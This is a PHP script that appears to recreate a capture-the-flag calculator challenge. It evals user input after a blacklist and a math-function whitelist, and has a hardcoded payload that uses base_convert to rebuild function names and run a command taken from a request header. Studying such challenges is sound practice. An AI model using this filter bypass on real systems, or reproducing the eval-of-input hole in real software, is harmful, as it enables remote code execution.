<?php
// Request Header 
// 1: code
$content = '$pi=base_convert,$pi(696468,10,26)(($pi(8768397090111664438,10,30))(){1})';
if (strlen($content) >= 80) {
    die("太长了不会算");
}
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
foreach ($blacklist as $blackitem) {
    if (preg_match('/' . $blackitem . '/m', $content)) {
        die("请不要输入奇奇怪怪的字符");
    }
}
//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
print_r($used_funcs[0]);
foreach ($used_funcs[0] as $func) {
    if (!in_array($func, $whitelist)) {
        die("请不要输入奇奇怪怪的函数");
    }
}
print($content.'<br>');
//帮你算出答案
eval('echo '.$content.';');
?>